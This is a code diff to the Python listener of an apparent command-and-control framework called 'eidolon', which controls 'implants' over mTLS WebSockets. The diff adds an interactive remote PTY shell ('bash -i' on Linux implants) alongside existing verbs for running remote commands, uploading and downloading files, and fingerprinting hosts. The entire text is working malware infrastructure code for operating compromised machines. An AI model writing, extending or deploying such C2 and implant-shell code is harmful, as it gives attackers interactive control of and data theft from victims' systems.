@@ -17,9 +17,14 @@ PROTOCOL — "ws-json-mtls/1" (one JSON object per WS text frame):
       {"id": N, "cmd": "upload",   "path": .., "data": <b64>}
       {"id": N, "cmd": "download", "path": ..}
       {"id": N, "cmd": "die"}
+      {"id": N, "cmd": "pty_open", "arg": "<cols>,<rows>"}   (go implants, linux)
+      {"cmd": "pty_in", "data": <b64>}     raw bytes into the pty
+      {"cmd": "pty_sz", "arg": "<cols>,<rows>"}
   implant -> listener (replies):
       {"id": N, "type": "result", "out": ..}
       {"id": N, "type": "dl", "path": .., "data": <b64>}
+      {"type": "pty_out", "data": <b64>}    streamed pty chunks (go implants)
+      {"type": "pty_exit"}
 
 mTLS KEY MATERIAL (first run generates it, then reuses):
   <cert_dir>/ca.crt / ca.key        self-signed 12-year authority
@@ -37,6 +42,9 @@ OPERATOR FLOW:
 
 INNER-SHELL VERBS:
   shell <cmd>        run a command, output streamed back (client shell)
+  pty                open an INTERACTIVE shell on the implant (bash -i on a
+                     real PTY — go implants on linux); from then on everything
+                     you type goes straight into the pty until you type .q
   sysinfo            ask the implant for a fingerprint blob
   upload <l> <r>     send a local file (realpath-contained, <= 4 MiB)
   download <r> <l>   fetch a remote file to <l> (0o600)
@@ -52,6 +60,7 @@ import os
 import posixpath
 import secrets
 import ssl
+import sys
 
 from eidolon.utils import ok, err, info, warn
 
@@ -231,6 +240,7 @@ class _SessionCtx:
         self.queue: asyncio.Queue = asyncio.Queue()
         self.seq = 0
         self.pending: dict = {}          # req id -> {"verb": .., "local": ..}
+        self.pty = False                 # true while lines flow into a pty
 
     def send_cmd(self, obj):
         self.queue.put_nowait(json.dumps(obj))
@@ -246,7 +256,7 @@ async def _writer(ctx: _SessionCtx):
 
 
 def _complete(text, line):
-    return [w for w in ("help", "shell", "sysinfo", "upload", "download", "die")
+    return [w for w in ("help", "shell", "pty", "sysinfo", "upload", "download", "die")
             if w.startswith(text)]
 
 
@@ -263,9 +273,19 @@ def _on_operator_line(ctx, line):
     if not parts:
         return
     verb, args = parts[0].lower(), parts[1:]
+    if ctx.pty and verb != ".q":
+        ctx.send_cmd({"cmd": "pty_in",
+                      "data": base64.b64encode((line + "\n").encode()).decode()})
+        return
     if verb in ("help", "?"):
-        info("verbs: shell <cmd> · sysinfo · upload <local> <remote> · "
-             "download <remote> <local> · die")
+        info("verbs: shell <cmd> · pty (interactive, .q back) · sysinfo · "
+             "upload <local> <remote> · download <remote> <local> · die")
+    elif verb == ".q":
+        if ctx.pty:
+            ctx.pty = False
+            info(f"[{ctx.sess.sid}] left pty — verbs again (help lists them)")
+        else:
+            info("not in pty mode — `pty` opens the interactive shell")
     elif verb == "shell" or verb == "!":
         ctx.seq += 1
         ctx.pending[ctx.seq] = {"verb": "shell"}
@@ -274,6 +294,10 @@ def _on_operator_line(ctx, line):
         ctx.seq += 1
         ctx.pending[ctx.seq] = {"verb": "sysinfo"}
         ctx.send_cmd({"id": ctx.seq, "cmd": "sysinfo"})
+    elif verb == "pty":
+        ctx.seq += 1
+        ctx.pending[ctx.seq] = {"verb": "pty"}
+        ctx.send_cmd({"id": ctx.seq, "cmd": "pty_open", "arg": "120,32"})
     elif verb == "upload" and len(args) >= 2:
         local, remote = args[0], args[1]
         try:
@@ -314,9 +338,23 @@ def _on_frame(ctx, raw):
         if pend and pend["verb"] == "sysinfo":
             for ln in out.splitlines():
                 info(f"[{ctx.sess.sid}] {ln}")
+        elif pend and pend["verb"] == "pty":
+            ctx.pty = True
+            info(f"[{ctx.sess.sid}] {out}")
         else:
             for ln in out.splitlines() or ["(no output)"]:
                 info(f"[{ctx.sess.sid}] {ln}")
+    elif rtype == "pty_out":
+        try:
+            data = base64.b64decode(msg.get("data", ""))
+        except Exception:
+            data = b""
+        if data:
+            sys.stdout.write(data.decode(errors="replace"))
+            sys.stdout.flush()
+    elif rtype == "pty_exit":
+        ctx.pty = False
+        info(f"[{ctx.sess.sid}] pty exited — verbs again (help lists them)")
     elif rtype == "dl" and pend:
         try:
             local = os.path.realpath(pend["local"])
@@ -389,6 +427,7 @@ async def handle(ws):
         pass
     finally:
         writer.cancel()
+        ctx.pty = False
         EIDOLON_SHELL._c2_on_event(("down", sess))
         info(f"implant gone: {sess.sid} ({peer})")
 
